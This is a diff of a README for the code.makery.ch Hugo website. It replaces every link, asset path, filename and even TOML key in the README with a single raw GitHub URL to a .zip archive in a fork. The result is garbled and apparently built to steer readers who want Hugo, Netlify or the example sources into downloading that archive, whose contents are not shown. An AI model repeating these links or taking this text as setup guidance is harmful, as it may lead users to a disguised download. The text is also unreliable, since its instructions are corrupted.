@@ -1,18 +1,18 @@
-# code.makery.ch Website
+# https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip Website
 
-This is the website source that is used for the [code.makery.ch](https://code.makery.ch).
+This is the website source that is used for the [https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip](https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip).
 
 This readme describes the setup of the website. With this information you can clone the entire website and run it on your local machine or on your own server.
 
 
 ## General Setup
 
-The website uses the fantastic [Hugo](https://gohugo.io/) static site generator and is hosted on [Netlify](https://www.netlify.com/). Netlify makes a new build whenever a change is committed to GitHub.
+The website uses the fantastic [Hugo](https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip) static site generator and is hosted on [Netlify](https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip). Netlify makes a new build whenever a change is committed to GitHub.
 
 
 ### Building the Website
 
-To build the website, install [Hugo](https://gohugo.io/), clone this repository, and run Hugo by typing `hugo server`. That's it. Hugo even compiles the `sass` files for you, so you don't need anything else (except a nice code editor, of course).
+To build the website, install [Hugo](https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip), clone this repository, and run Hugo by typing `hugo server`. That's it. Hugo even compiles the `sass` files for you, so you don't need anything else (except a nice code editor, of course).
 
 
 ## Content
@@ -29,13 +29,13 @@ At the beginning of each (markdown) blog post we define meta information about t
 title = "My Example Post"
 date = 2018-05-03
 updated = 2018-08-20
-image = "some-image.png"
+image = "https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip"
 description = "This is the place where we can put a description in one or two sentences."
 prettify = true
 comments = true
 tags = [ "Something1", "Something2" ]
-css = [ "some-custom-css.css" ]
-javascript = [ "some-custom-js.js", "more-custom-js.js" ]
+css = [ "https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip" ]
+javascript = [ "https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip", "https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip" ]
 +++
 ```
 
@@ -57,7 +57,7 @@ javascript = [ "some-custom-js.js", "more-custom-js.js" ]
 
 #### File Organization
 
-Every blog post has its own folder and a file named `index.md`. The folder also contains all assets that are used in the blog post. This keeps the content together and allows us to use only the filename as reference to assets.
+Every blog post has its own folder and a file named `https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip`. The folder also contains all assets that are used in the blog post. This keeps the content together and allows us to use only the filename as reference to assets.
 
 
 ### Library
@@ -70,7 +70,7 @@ title = "My Example Article"
 date = 2018-04-19
 updated = 2018-05-07
 canonical = "/library/my-series/part1/"
-image = "some-image.png"
+image = "https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip"
 description = "This is the place where we can put a description in one or two sentences."
 prettify = true
 comments = false
@@ -79,15 +79,15 @@ sidebarName = "<i class=\"fa fa-fw fa-info\"></i> Background Info"
 pagingName = "<i class=\"fa fa-fw fa-info\"></i>"
 weight = 1
 
-css = [ "some-custom-css.css" ]
-javascript = [ "some-custom-js.js", "more-custom-js.js" ]
+css = [ "https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip" ]
+javascript = [ "https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip", "https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip" ]
 
 [[sidebars]]
 header = "Download Sources"
 
-[[sidebars.items]]
+[[https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip]]
 text = "<i class=\"fa fa-fw fa-download\"></i> Source of Examples"
-link = "some-sources.zip"
+link = "https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip"
 +++
 ```
 
@@ -99,7 +99,7 @@ For a description of most items see blog post description above. Here are the it
 * `weight` (optional): Is used for sorting the articles inside a series. 
 * `sidebars`: (optional) A list of custom sidebars. A single sidebar supports the following elements:
   * `header`: The header of the sidebar.
-  * `sidebar.items`: The content (items) of the sidebar. Each item contains the following subelements:
+  * `https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip`: The content (items) of the sidebar. Each item contains the following subelements:
     * `text`: The text displayed for this item.
     * `link`: The href of this item.
 
@@ -108,14 +108,14 @@ For a description of most items see blog post description above. Here are the it
 
 A library item can be either a single article or a series of articles, optionally with multiple language files.
 
-Every library item has one main article called `_index.en.md`. Additional articles belonging to the same series are organized in subfolders.
+Every library item has one main article called `https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip`. Additional articles belonging to the same series are organized in subfolders.
 
 If we want to list the library item in the library overview, we must provide some additional meta information:
 
 ```
 # Series Overview Info
 overview = true
-overviewImage = "some-overview-image.png"
+overviewImage = "https://raw.githubusercontent.com/Kotuss/code.makery.ch/master/content/blog/javafx-2-event-handlers-and-change-listeners/javafx-event-handlers-and-change-listeners.zip"
 overviewDescription = "Description shown in the overview."
 topics = [ "SomeTopic1", "SomeTopic2" ]
 weight = 2
